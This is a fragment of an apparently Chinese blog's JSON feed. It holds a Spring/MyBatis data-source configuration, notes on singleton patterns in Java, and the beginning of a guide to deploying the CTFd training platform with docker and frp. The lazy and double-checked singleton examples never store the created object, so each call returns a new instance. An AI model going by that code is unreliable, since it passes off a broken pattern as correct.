<span class=\"token class-name\">String</span> username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;jdbc.password&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> password<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">DruidDataSource</span> <span class=\"token function\">dataSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token class-name\">DruidDataSource</span> dataSource<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DruidDataSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        dataSource<span class=\"token punctuation\">.</span><span class=\"token function\">setDriverClassName</span><span class=\"token punctuation\">(</span>driver<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        dataSource<span class=\"token punctuation\">.</span><span class=\"token function\">setUrl</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        dataSource<span class=\"token punctuation\">.</span><span class=\"token function\">setUsername</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        dataSource<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">return</span> dataSource<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SqlSessionFactory</span> <span class=\"token function\">sqlSessionFactory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token class-name\">SqlSessionFactoryBean</span> factoryBean <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SqlSessionFactoryBean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        factoryBean<span class=\"token punctuation\">.</span><span class=\"token function\">setTypeAliasesPackage</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.sk.day31.entity\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        factoryBean<span class=\"token punctuation\">.</span><span class=\"token function\">setMapperLocations</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">PathMatchingResourcePatternResolver</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getResources</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"classpath:mapper/*.xml\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        factoryBean<span class=\"token punctuation\">.</span><span class=\"token function\">setDataSource</span><span class=\"token punctuation\">(</span><span class=\"token function\">dataSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> factoryBean<span class=\"token punctuation\">.</span><span class=\"token function\">getObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>到此就算是整合完毕了</p>\n",
            "tags": [
                "笔记",
                "SpringMVC",
                "Spring",
                "MyBatis",
                "源码"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/",
            "url": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/",
            "title": "设计模式-单例模式",
            "date_published": "2022-11-25T03:34:36.000Z",
            "content_html": "<h1 id=\"懒汉式\"><a class=\"anchor\" href=\"#懒汉式\">#</a> 懒汉式</h1>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LazySingleton</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">SingletonObject</span> singletonObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">SingletonObject</span> <span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>singletonObject <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SingletonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> singletonObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>延迟加载对象，只有在用到的时候才回去创建，但是多线程情况下会有线程安全问题。</p>\n<h1 id=\"懒汉式-线程安全\"><a class=\"anchor\" href=\"#懒汉式-线程安全\">#</a> 懒汉式 - 线程安全</h1>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LazySingleton</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">SingletonObject</span> singletonObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">SingletonObject</span> <span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>singletonObject <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SingletonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> singletonObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>使用 synchronized 关键字加锁，虽然解决了线程安全问题，但是导致每一个线程想要获取对象都要先获取锁，但这个锁又只有在创建对象时才有用，所以非常影响性能。</p>\n<h1 id=\"饿汉式\"><a class=\"anchor\" href=\"#饿汉式\">#</a> 饿汉式</h1>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HungrySingleton</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">SingletonObject</span> singletonObject<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SingletonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">SingletonObject</span> <span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> singletonObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>相比较懒汉式，饿汉式线程安全，类加载时就会创建好对象，但是问题如果该对象并不会使用，但他还是会被加载到内存中，浪费内存。</p>\n<h1 id=\"双重检测\"><a class=\"anchor\" href=\"#双重检测\">#</a> 双重检测</h1>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">DoubleCheckSingleton</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">SingletonObject</span> singletonObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">SingletonObject</span> <span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>singletonObject<span class=\"token operator\">==</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">DoubleCheckSingleton</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>singletonObject<span class=\"token operator\">==</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SingletonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> singletonObject<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这种模式将饿汉式的 synchronized 关键字转换成代码块的形式，并在外部又加了一层 if 判断，这样创建对象时就不会有线程安全问题，并且由于外层 if 的存在，后续获取对象的操作也不会受 synchronized 影响。</p>\n<h1 id=\"枚举模式\"><a class=\"anchor\" href=\"#枚举模式\">#</a> 枚举模式</h1>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">enum</span> <span class=\"token class-name\">EnumSingleton</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token constant\">INSTANCE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"something...\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "笔记",
                "设计模式"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/CTFd+CTFd-Whale%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/",
            "url": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/CTFd+CTFd-Whale%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/",
            "title": "CTFd+CTFd-Whale部署实践",
            "date_published": "2022-09-04T13:42:19.000Z",
            "content_html": "<p>#CTF</p>\n<h1 id=\"引言\"><a class=\"anchor\" href=\"#引言\">#</a> 引言</h1>\n<p>放暑假了，想着搭建一个 ctf 靶场训练下新生，但遇到的问题比我想象中的多得多。。。写个 blog 记录一下。</p>\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h1>\n<ul>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92YWFsYS5jYXQvMjAyMC8wOS8yMS9jdGZkJUU0JUJEJUJGJUU3JTk0JUE4Y3RmZC13aGFsZSVFNSU4QSVBOCVFNiU4MCU4MSVFOSU5RCVCNiVFNiU5QyVCQSVFNiU4RiU5MiVFNCVCQiVCNiVFNiU5MCVBRCVFNSVCQiVCQSVFOSU5RCVCNiVFNSU5QyVCQSVFNiU4QyU4NyVFNSU4RCU5Ny8=\">ctfd 使用 ctfd-whale 动态靶机插件搭建靶场指南</span></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTcvYXJ0aWNsZS9kZXRhaWxzLzEwMDg1MDc1Ng==\">手把手教你如何建立一个支持 ctf 动态独立靶机的靶场（ctfd+ctfd-whale）</span></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhhb2ouaW4vcmVhZC02MzMzLmh0bWwvY29tbWVudC1wYWdlLTEjX0RpcmVjdF9GcnA=\">CTFd-Whale 推荐部署实践</span></p>\n</li>\n</ul>\n<p><s>三篇文章所使用的方法基本上差不多，但是部署的 ctfd 版本和插件版本不尽相同，第一篇文章中使用的是</s><a href=\"https://github.com/frankli0324/ctfd-whale\"><s> frankli0324</s></a><s> 师傅修改后的 ctfd-whale，但是部署上之后测试发现，renew 功能无法使用，不知道是不是我部署错误的问题，而第二篇则是无法正确的映射题目的端口，所以最后还是选择了官方的部署教程。</s></p>\n<p>经过更新后，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZyYW5rbGkwMzI0L2N0ZmQtd2hhbGU=\">frankli0324</span> 师傅修改后的 ctfd-whale 已经可以正常使用。</p>\n<h1 id=\"部署\"><a class=\"anchor\" href=\"#部署\">#</a> 部署</h1>\n<h2 id=\"环境准备\"><a class=\"anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<ul>\n<li>\n<p>安装 docker</p>\n</li>\n<li>\n<p>安装 docker-compose</p>\n</li>\n</ul>\n<h2 id=\"配置swarm\"><a class=\"anchor\" href=\"#配置swarm\">#</a> 配置 swarm</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>docker swarm init</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>docker node update <span class=\"token operator\">--</span>label<span class=\"token operator\">-</span>add<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'name=linux-1'</span> $<span class=\"token punctuation\">(</span>docker node ls <span class=\"token operator\">-</span>q<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"安装\"><a class=\"anchor\" href=\"#安装\">#</a> 安装</h2>\n<ol>\n<li>下载 ctfd</li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/CTFd/CTFd --depth=1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cd CTFd</pre></td></tr></table></figure><ol start=\"2\">\n<li>修改 docker-compose.yml</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>version <span class=\"token string\">'2'</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> version <span class=\"token string\">'3'</span></pre></td></tr></table></figure><p>接着 <code>docker-compose up -d</code> ，对 CTFd 进行初始配置。</p>\n<ol start=\"3\">\n<li>配置 frps，在 docker-compose-yml 中配置如下：</li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>services<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token operator\">...</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    frps<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        image<span class=\"token punctuation\">:</span> glzjin<span class=\"token operator\">/</span>frp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        restart<span class=\"token punctuation\">:</span> always</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        volumes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token operator\">-</span> <span class=\"token operator\">.</span><span class=\"token operator\">/</span>conf<span class=\"token operator\">/</span>frp<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>conf</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        entrypoint<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token operator\">-</span> <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>frps</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token operator\">-</span> <span class=\"token operator\">-</span>c</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token operator\">-</span> <span class=\"token operator\">/</span>conf<span class=\"token operator\">/</span>frps<span class=\"token operator\">.</span>ini</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        ports<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token operator\">-</span> <span class=\"token number\">10000</span><span class=\"token operator\">-</span><span class=\"token number\">10100</span><span class=\"token punctuation\">:</span><span class=\"token number\">10000</span><span class=\"token operator\">-</span><span class=\"token number\">10100</span>  <span class=\"token comment\"># 映射 direct 类型题目的端口</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token operator\">-</span> <span class=\"token number\">8001</span><span class=\"token punctuation\">:</span><span class=\"token number\">8001</span>  <span class=\"token comment\"># 映射 http 类型题目的端口</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        networks<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 需要将 frps 暴露到公网以正常访问题目容器</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            frp_connect<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>              ipv4_address<span class=\"token punctuation\">:</span> <span class=\"token number\">172.1</span><span class=\"token number\">.0</span><span class=\"token number\">.3</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>networks<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token operator\">...</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    frp_connect<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        driver<span class=\"token punctuation\">:</span> overlay</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        internal<span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">true</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        ipam<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            config<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                <span class=\"token operator\">-</span> subnet<span class=\"token punctuation\">:</span> <span class=\"token number\">172.1</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">16</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>创建目录 ./conf/frp，并创建 <code>frps.ini</code>  文件，填写：</li>\n</ol>\n<figure class=\"highlight dockerfile\"><figcaption data-lang=\"Docker\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>[common]</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 下面两个端口注意不要与 direct 类型题目端口范围重合</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bind_port = 7987  # frpc 连接到 frps 的端口</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td 